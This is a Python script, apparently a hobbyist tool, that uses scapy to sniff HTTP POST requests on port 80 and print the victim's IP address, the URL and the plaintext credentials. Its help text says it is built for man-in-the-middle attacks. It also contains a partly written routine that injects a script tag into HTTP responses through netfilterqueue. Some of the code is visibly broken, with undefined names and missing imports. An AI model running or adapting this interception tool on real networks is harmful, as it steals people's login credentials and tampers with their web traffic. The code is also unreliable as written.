#!/bin/python3
import argparse
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.sendrecv import sniff
import urllib
import re
import netfilterqueue


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def change_payload(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def credentialsSniffing(packet):
    try:
        http = scapy.IP(packet.get_payload())
        if http.haslayer(scapy.Raw):
            load = http[scapy.Raw].load
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            injection = "<script>alert(1)</script>"
            load = load.replace("</body>", injection_code + "</body>")
            length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            length = length_search.group(1)
            new_length = int(length) + len(injection)
            load = load.replace(length, str(new_length))
            if load != http_packet[scapy.Raw].load:
                new_packet = change_payload(http_packet, load)
                packet.set_payload(str(new_packet))
                packet.accept()
                print("lo intenta")
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, inject_code)
            queue.run()

        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            ipVictim = packet[IP].src
            credentials = packet[Raw].load.decode("utf-8")
            print(f'{bcolors.OKBLUE}---New HTTP POST---{bcolors.ENDC}')
            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}")
    except:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
                                                 "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
                                                 "If you are using it with a dhcp server, you need to enable forwarding.")
    print("Sniffing...")
    sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
